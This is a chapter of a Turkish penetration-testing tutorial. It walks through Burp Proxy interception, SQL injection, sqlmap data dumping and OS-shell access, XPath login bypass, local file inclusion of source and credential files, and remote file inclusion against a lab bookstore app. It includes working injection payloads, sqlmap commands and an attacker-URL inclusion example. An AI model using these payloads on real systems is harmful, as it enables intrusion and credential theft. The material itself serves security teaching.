### WEB UYGULAMALARI

Otomatik tarayıcıların bilinen güvenlik açıklarını bulmada iyi olabilir, ama genel olarak kendi özel web uygulamasını geliştirenler de var. Onlar için bazı ücretli programlar ile tarama yapılabilse bile, iyi bir penetrasyon tester için proxy denemelerinin yerini alamaz.

Her programda olduğu gibi, web programlarında da doğru sterilize edilmemiş girişler olabilir. Mesela bir sorgu, veritabanla iletişime geçerken kullanıcıdan adını veya şifresini istemektedir. Şimdi kullanıcı oraya isim değilde, veritabanında çalışan bir zararlı komut yazdığında, veriyi çalabilir veya kimlik doğrulamasını aşabilir.

Bu bölümde de bunun gibi dikkat etmemiz gerek genel güvenlik açıklarını Windows 7 sistemimize kurduğumuz, basit bir kitapçı uygulamamız üstünde denemeler yapacağız.

#### Burp Proxy kullanımı

Proxy kullanarak bizim tarayıcımız ile web uygulaması arasında geçen sorguları görebilir, kesin olarak hangi verilerin iletildiğine bakabiliriz. Kali Linux proxy özelliği olan web uygulamalarını denemeye yarayan Burp Suite programının bedava versiyonunu bulundurmaktadır.

Burp Suite başlatmak için __Applications > Kali Linux > Web Applications > Web Application Fuzzers > burpsuite__ 

![resim1]

Aşağıdaki gibi __Proxy__ üstüne basalım. Varsayılan olarak, __Intercept is on__ özelliği açık olacaktır; bu web tarayıcısndan giden istekleri yakalayarak bize onları sunucuya göndermeden önce görmemizi, hatda üstünde değişikler yapmamızı sağlayacaktır.

![resim2]

Şimdi Kali Linux'umuzda çalışan tarayıcıya web trafiğin Burp Suite üzerinden geçmesini söylememiz gerekiyor.

1. _Iceweasel_ tarayıcısını açalım, __Edit > Preferences > Advanced__ gelerek __Network__ seçelim.
2. Connection sağında olan __Settings__ tıklayalım.
3. Resimdeki gibi, __Manul proxy configuration__ seçerek IP adrese __127.0.0.1__ ve porta __8080__ girelim. Böylelikle Burp Proxy'nin varsayılan portuna yönlendirmiş olcağız.

![resim3]

Iceweasel'in trafiği Burp Suite üzerinden aktardığına emin olmak için, Windows 7 makinemizde çalışan http://192.168.2.12/bookservice adresini açalım.

Bağlantının tarayıcıda askıya alındığı görülecektir, ve resimde olduğu gibi hem tarayıcıda hem de Burp Suit'ta bookservice sitesinin ana sayfası için `HTTP GET` isteği gönderildiği görüntülenecektir.

![resim4]

Aldığımız `HTTP GET` sorgusu için daha detaylı bir bilgi edinebiliriz. Biraz sonra göreceğiz ki, bunları sunucuya göndermeden bazı değişiklikler de yapabiliceğiz. Ama şimdilik sadece __Forward__ basarak devam ettirelim. Tarayıcıya geri dönersek, server'in bizi bookservice sitesinin ana sayfayasına yönlendirdiğini göreceğiz.

![resim5]

Şimdi, bu siteye bir üye olalım. Yukarıda sağda __Login__ tıklayalım, sonra sorguyu proxy'dan server'a forward yapalım. Aynı şeyi Sign up sayfasına gidebilmek için __New User__ üstüne tıklayarak ta tekrarlayalım.

![resim6]

Kullanıcı adı, şifre, ve mail adresimizi girdikten sonra __Go__ basalım. Sorgumuz resimde gösterildiği gibi Bupr Proxy tarafından yakalanmış olması lazım.

![resim7]

Ek olarak, okumak için pek iyi olmayan _raw request (ham sorgu)_ yerine __Params__ basarak Burp Suit'in sorgumuzu daha okunabilir halini göstermesini sağlayabiliriz.

![resim8]

Mesela, yeni açtığımız ekranda kullanıcı alanı _cansu_, şifre alanı _password_, ve mail alanı cansu@hotmail.com gösterir.

Şimdi istersek burda şifreyi _password_ yerine _password123_ yaparak sorgumuzu sunucuya göndermeden değiştirebiliriz, ve sunucu _cansu_ için _password123_ şifresini atayacaktır, çünkü sunucun sorgunun orjinal halinden haberi olmamaktadır.

Proxy sunucuya gönderilen sorguları daha detaylı bir şekilde görmemizi sağlamaktadır. Bazen proxy trafiğini istemiğimiz de olacaktır, onun için __Intercept on__ basarak __Intercept off__ değiştirebiliriz. Sonradan gene bir sorgu yakalamak için lazım olursa geri açarız.

#### SQL Injection

Bir uygulama kullanılarak veritabanına gönderilen SQL sorgularına, uygulamanın yazarı tarafından beklenmeyen kod enjekte etmeye sql injection denir. Uygulamanın veritabanı yönetim sistemine gönderdiği sorgular değiştirilerek, sistemdeki veritabanları ve onlara kayıtlı olan bütün bilgiler okunabilir, değiştirilebilir veya silinebilir. Daha sonraki saldırılarda DBMS üzerinden sisteme shell atılabilir ve uzaktan bağlanıp kullanıcı yetkilerinin izin verdiği ölçüde kod çalıştırılabilir.

__SQL Injection Kullanarak Gerçekleştirilmiş Saldırı örnekleri__

* D33Ds Company isimli hack grubu union tabanlı sql injection saldırısı gerçekleştirerek ele geçirdiği 453000 yahoo müşterisinin bilgilerini internete sızdırdı.

* MySql.com Blind Sql injection kullanılarak hacklendi. Saldırganlar ele geçirdikleri kullanıcı adı ve şifre özetlerini internette yayınladı.

* Aralarında Coca Cola, Intel ve BBC'nin bulunduğu bir çok israilli site pakistanlı hackerlar tarafından SQL injection kullanılarak hacklendi.

* Yaklaşık 6.5 milyon linkedin şifre özeti kullanıcı adları olmadan internete sızdırıldı.

Doğal olarak SQL injection için ilk bakacağımız yer sitenin kullanıcı girişi sayfası olacaktır. Çoğu web uygulamaları kullanıcı bilgilerini SQL veritabanında tuttuğu için, uygulama girmiş olduğumuz verilere göre veritabanına sorgu gönderir. O sitenin kurucusu kullanıcı girişi sterilize etmediyse, o siteye SQL sorgularını göndererek saldırı düzenleyebiliriz. Mesela SQL sorgumuz bu olsun:

```sql
SELECT id FROM users WHERE  username='$username' AND password='$password';
```

Eğer saldıran kişi kullanıcı adına `'OR '1'='1` ve şifresine `'OR '1'='1` yazarsa?

```sql
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

`'OR '1'='1`  herzaman doğru olduğundan, çalışmakta olan `SELECT` sorgusu herzaman girilen verinin doğru olup olmadığına bakmaksızın veritanındaki ilk kullanıcı isim ve şifreyi verecektir.

![resim9]

##### SQL Injection Güvenlik Açıkları İçin Test

SQL Injection güvenlik açığını bulmak için ilk yapacağımız test tek tırnak işareti ile SQL sorgusunu kapatmayı denemek olacaktır. Eğer SQL injection açığı varsa, eklediğimiz bu terk tırnak işareti yüzünden SQL hatası alacağız, çünkü sorgu cümlesi bitmiş ve ekstra tek tırnak işareti SQL hatası vermiş olacaktır. Bu hata bize o sitenin SQL açığı olduğunun habercisidir.

O zaman bookservice sitesini açarak _id_ parametresini _1'_ yaparak sorgu göndermeyi deneyelim:

```
http://192.168.20.12/bookservice/bookdetail.aspx?id=1'
```

Beklediğimiz gibi, uygulamamız SQL hatası olduğuna dair bir hata verdi.

Özellikle, hata mesajına dikkat edersek __'Unclosed quotation mark after the character string'__, yani kapanmamış bir tırnak işaretçisinden şikayetçi.

##### SQL Injection Açıklarından Faydalanma

Şimdi bu sitenin bir SQL injection güvenlik açığı olduğunu öğrendikten sonra, biz bu açıktan faydalanarak site geliştiricisinin hiç amaçlamadığı bir sorgulama yapabiliriz. Mesela, veritabanındaki ilk ismi bulabiliriz:

```
http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
```

Bu sorgu _Conversion failed when converting the nvarcar value 'BookApp' to data type int_ hatası vermektedir, yani veritabanındaki ilk isim BookApp.

![resim10]

#### SQLMap kullanımı

Ayrıca biz, bir site üzerinde çeşitli görevleri yerine yetirme için SQL injection kullanarak SQL sorgularını otomatik oluşturan araçları da kullanabiliriz. Gereken tek şey enjeksyon noktası; geri kalanını aracımız yapacaktır. Mesela aşağıda, Kalinin aracı olan SQLMap'a enjekte olabilecek linki nasıl verileceğini göstermekte, SQLMap bizim için güvenlik açığı olabilecek SQL sorgularını test eder ve enjeksyon sorgularını çalıştırır.

```ShellSession
root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dump 
--snip--
[21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable 
--snip--
Database: BookApp
Table: dbo.BOOKMASTER
[9 entries]
+--------+---------------+-------+-------+-------------------------------------
| BOOKID | ISBN          | PRICE | PAGES | PUBNAME | BOOKNAME
| FILENAME | AUTHNAME | DESCRIPTION

|
+--------+---------------+-------+-------+-------------------------------------
| 1 | 9780470412343 | 11.33 | 140 | Que; 1st edition (October 23, 2000) | Do not Make Me Think A Common Sense Approach to Web Usability | 
4189W8B2NXL.jpg | Steve Krug and Roger Black | All of the tips, techniques, and examples presented revolve around users being able to surf merrily through a well-designed site with minimal cognitive strain. Readers will quickly come to agree with many of the books assumptions, such as We do not read pages--we scan them and We do not figure out how things work--we muddle through. Coming to grips with such hard facts sets the stage for Web design that then produces topnotch sites. |
--snip-- |
```

```ShellSession
root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell 
--snip--
xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] Y
--snip--
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y command standard output: 'nt authority\system'
```

#### XPath Enjeksiyonu

Bizim üstünde deneme yaptığımız bookservice uygulaması kullanıcı kimlik doğrulaması için veritabanı yerine Xpath (XML sorgulama dili) kullanmaktadır. SQL sentaks değişse bile, enjeksyon prosesi hemen hemen aynıdır.

Mesela, giriş sayfasındaki kullanıcı adı ve şifre alanların her ikisine de tek tırnak işareti (') koymayı deneyelim. Aşağıdakiye benzer bir hatayla karşılaşacağız.

![resim11]

Mantık SQL de yaptığımızın aynısı, hata veriyorsa demekki burda bir SQL injection açığı var ve bizim sızma yapabilmemiz için bir yoldur. Burp Proxy programı ile sorguları izleyelim ve __txtUser__ ve __txtPass__ değerlerine `' or '1'='1` atayalım.

![resim12]

Yaptığımız bu sorgu Xpath'a kullanıcı adı ve şifresi boş veya 1=1 olan veriye döndür demektir. 1=1 herzaman `true` yani doğru olacağından kullanıcı adı boş olan veya mevcut bir kullanıcıyı sorgulamaktadır. Böylece biz bu metodla XML dosyasında saklanan ilk kullanıcın ismiyle giriş yapmış oluyoruz, yani _Mike_.

![resim13]

#### Yerel Dosya İçerme

Web uygulamalarında bulunan diğer bir önemli açıklardan biri de _yerel dosya içerme (local file inclusion)_. Web uygulamasında normalde erişime izinli olmamız gereken dosyaları okuyabilmek. 

Bizim bookservice uygulamamız da bu açığı içermektedir. _Mike_ olarak __Profile > View Newsletters__ gidelim. Listteki ilk newsletter tıklayarak içeriğine bir bakalım. 

![resim14]

Şimdi ise sorguyu tekrarlayarak, Burp Proxy ile izleyelim:

![resim15]

__Params__'a gelerek, _c:\inetpub\wwwroot\Book\NewsLetter\Mike@Mike.com\Web Hacking Review.txt_ parametresini not alalım. Bu _c:\inetpub\wwwroot\Book\NewsLetter\Mike_ yolu bize newsletter özelliğinin yerel dosya sisteminden çekildiği konusunda fikir vermekte. _Newsletter_ dizininde _Mike@Mike.com_ dosyasının olduğunu da görebiliyoruz. Burdan diyebiliriz ki; Büyük ihtimalle sitenin newsletter bölümüne kaydolan her kullanıcın da böyle bir dosyası vardır. 

Bir diğer konu da, uygulamamızın asıl yolu tahmin edebileceğimiz gibi _c:\inetpub\wwwroot\bookservice_ değilde _c:\inetpub\wwwroot\Book_ olmasına dikkat etmemiz. Bunu da bir kenara not alalım ki, sonra lazım olur.

Eğer biz parametrelerdeki dosya ismini uygulamadaki başka bir dosya ismine değiştirirsek? Uygulamanın tüm kaynak koduna erişebilirmiyiz? Mesela, dosya ismini `C:\inetpub\wwwroot\Book\Search.aspx` olarak değiştirsek ve sorguyu çalıştırsak.

![resim16]

Gördüğünüz gibi, _Search.aspx_ dosyasının kaynak kodunu Newsletter kutusunda gösterildi.

Belki biz daha hassas bilgilerin saklandığı dosyalara da erişebiliriz. Mesela, kullanıcı isimlerin ve şifrelerin bir XML dosyasında saklandığını biliyoruz. Bunun için birkaç genel dosya isimlerini tahmin ederek bulabiliriz. XML kimlik doğrulamada kullanılan çözümler bize dosya isminin _AuthInfo.xml_ olduğuna dair bir ipucu verebilir. Burp Proxy ile sorguyu izleyelim, ve sorgudaki dosya ismini `C:\inetpub\wwwroot\Book\AuthInfo.xml` olarak değiştirelim.

![resim17]

Gördüğünüz gibi, şimdi kullanıcı adlarına ve şifrelerine düz bir metin olarak erişim sağlayabiliyoruz. Yukarda çalıştırdığımız sorgunun niye _Mike_ döndürdügünü de bu ismin ilk sırada olmasından bilebiliriz.

##### Uzaktaki Dosyayı İçerme

Uzaktaki dosyayı içerme (Remote file inclusion - RFI) açıkları saldırıcıya başka bir yerdeki savunmasız sunucuda olan kötü amaçlı scriptleri çalıştırmaya yol açar. Mantık olarak bir sitenin sunucusunda başka bir uzaktaki scripti dahil ederek çalıştırmak. Denemelerimiz için kullandığımız _bookservice_ uygulaması bu açığı barındırmamaktadır. Genel bir bilgi sahibi olmanız için basit bir örnek:

```php
<?php
    include($_GET[‘file’]);
?>
```

Yani, saldırıcı _file_ parametresi yerine uzaktaki _http://saldıran_ip/zararlı_kod.php_ dosyasını içererek, sunucuda çalışmasını sağlayabilir.

##### Cross-Site Scripting



[resim1]: ../resim/ataklar/web/1.png
[resim2]: ../resim/ataklar/web/2.png
[resim3]: ../resim/ataklar/web/3.png
[resim4]: ../resim/ataklar/web/4.png
[resim5]: ../resim/ataklar/web/5.png
[resim6]: ../resim/ataklar/web/6.png
[resim7]: ../resim/ataklar/web/7.png
[resim8]: ../resim/ataklar/web/8.png
[resim9]: ../resim/ataklar/web/9.png
[resim10]: ../resim/ataklar/web/10.png
[resim11]: ../resim/ataklar/web/11.png
[resim12]: ../resim/ataklar/web/12.png
[resim13]: ../resim/ataklar/web/13.png
[resim14]: ../resim/ataklar/web/14.png
[resim15]: ../resim/ataklar/web/15.png
[resim16]: ../resim/ataklar/web/16.png
[resim17]: ../resim/ataklar/web/17.png
[resim18]: ../resim/ataklar/web/18.png
[resim19]: ../resim/ataklar/web/19.png
[resim20]: ../resim/ataklar/web/20.png
[resim21]: ../resim/ataklar/web/21.png
[resim22]: ../resim/ataklar/web/22.png



http://www.slideshare.net/bgasecurity/sql-ve-sql-injection?related=1

http://www.slideshare.net/bgasecurity/web-uygulama-gvenliine-kartal-bak?related=1

http://www.slideshare.net/msdundar/w3afyi-taniyalim-4335734

http://www.slideshare.net/bgasecurity/w3af-ile-web-uygulama-gvenlik-testleri-ii

http://www.slideshare.net/bgasecurity/web-uygulama-pentest-egitimi?related=1

http://www.slideshare.net/bgasecurity/bga-bank-web-gvenlik-testleri-uygulama-kitab